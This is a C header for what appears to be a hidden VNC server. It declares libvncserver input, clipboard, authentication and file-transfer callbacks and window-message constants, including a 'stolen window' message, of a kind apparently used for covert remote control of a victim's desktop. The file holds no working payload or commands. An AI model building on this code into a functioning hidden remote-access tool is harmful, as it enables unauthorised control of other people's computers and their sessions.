#ifndef EVENTS_H_INCLUDED
#define EVENTS_H_INCLUDED

#define VMW_EXECUTE_MENU        1
#define VMW_HILITE_MENU         2
#define VMW_UPDATE_KEYSTATE     3
#define VMW_PRINT_SCREEN        4
#define VMW_DISPCHANGES         5
#define VMW_CHANGELAYOUT        6
#define VMW_IQTEST              7
#define VMW_ERASEBKG            8
#define VMW_TBHITTEST           9
#define VMW_TBLCLICK            10
#define VMW_TBRCLICK            11
#define VMW_SHOWSYSMENU         12
#define VMW_SETSTOLENWINDOW     13
#define VMW_ISTRANSMSGUSED      14

void OnKeyboardEvent(rfbBool downflag,rfbKeySym key,rfbClientPtr cl);
void OnPointerEvent(int buttonMask,int x,int y,rfbClientPtr cl);
void OnReceiveClipboard(char* str,int len,_rfbClientRec* cl);
rfbBool OnNewClientAuth(rfbClientPtr cl,const char* response,int len);
enum rfbNewClientAction OnNewClient(rfbClientPtr cl);
int OnFileTransfer(rfbClientPtr cl);

void CALLBACK ScreenUpdateThread(PHVNC lpServer);
void SendClipboard(PHVNC lpServber);

#define SPI_SETCLIENTAREAANIMATION 0x1043
#define SPI_SETDISABLEOVERLAPPEDCONTENT 0x1041

#define RFB_SLEEP_TIME 1000
#define MAX_IDLE_COUNT 3

void NotifyAllProcess(PHVNC lpServer,DWORD dwMsg,DWORD dwParam);

bool SendThreadMessageTimeout(PHVNC lpServer,DWORD dwID,DWORD dwMsg,DWORD dwParam,DWORD dwTimeOut);
#define SendThreadMessage(lpServer,dwID,dwMsg,dwParam) SendThreadMessageTimeout(lpServer,dwID,dwMsg,dwParam,INFINITE)

struct IE_SHIT
{
    TCHAR *lpName;
    DWORD dwValue;
};

#define MAX_IDLE_TIME 2*60*1000

extern "C" rfbClientIteratorPtr rfbGetClientIteratorWithClosed(rfbScreenInfoPtr rfbScreen);
extern "C" rfbClientPtr rfbClientIteratorHead(rfbClientIteratorPtr i);
extern "C" void rfbClientConnectionGone(rfbClientPtr cl);

struct SPI_INFO
{
    UINT uiAction;
    LPVOID pvParam;
};

#endif // EVENTS_H_INCLUDED
